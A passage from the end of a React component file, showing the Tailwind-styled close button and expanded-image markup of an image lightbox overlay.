            className="absolute right-4 top-4 z-10 flex h-10 w-10 items-center justify-center rounded-full bg-black/60 text-white text-xl hover:bg-black/80 transition-colors">
            ✕
          </button>
          <img src={expandedImg} alt="Expanded view"
            className="max-h-[85vh] max-w-[95vw] w-auto h-auto rounded-lg shadow-2xl cursor-default"
            onClick={(e) => e.stopPropagation()} />
        </div>
      )}
    </div>
  )
}
